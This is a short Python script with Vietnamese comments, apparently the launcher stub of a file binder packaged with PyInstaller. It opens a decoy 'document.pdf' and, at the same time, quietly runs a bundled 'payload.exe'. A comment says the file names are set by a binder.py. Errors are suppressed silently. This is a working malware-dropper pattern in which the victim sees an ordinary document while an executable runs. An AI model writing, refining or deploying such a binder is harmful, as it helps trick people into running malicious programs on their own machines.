import os
import sys
import subprocess
import threading

def resource_path(relative_path):
    """ Lấy đường dẫn tuyệt đối đến tài nguyên, hỗ trợ cả khi chạy file .py và .exe """
    try:
        # PyInstaller tạo một thư mục tạm và lưu trữ đường dẫn trong _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def open_pdf(pdf_name):
    try:
        path = resource_path(pdf_name)
        if os.path.exists(path):
            os.startfile(path)
    except Exception as e:
        pass

def run_exe(exe_name):
    try:
        path = resource_path(exe_name)
        if os.path.exists(path):
            # Chạy file EXE ngầm hoặc công khai tùy mục đích
            subprocess.Popen(path, shell=True)
    except Exception as e:
        pass

if __name__ == "__main__":
    # Tên file sẽ được binder.py thay thế hoặc cấu hình
    PDF_FILE = "document.pdf"
    EXE_FILE = "payload.exe"

    # Chạy đồng thời cả 2
    t1 = threading.Thread(target=open_pdf, args=(PDF_FILE,))
    t2 = threading.Thread(target=run_exe, args=(EXE_FILE,))
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
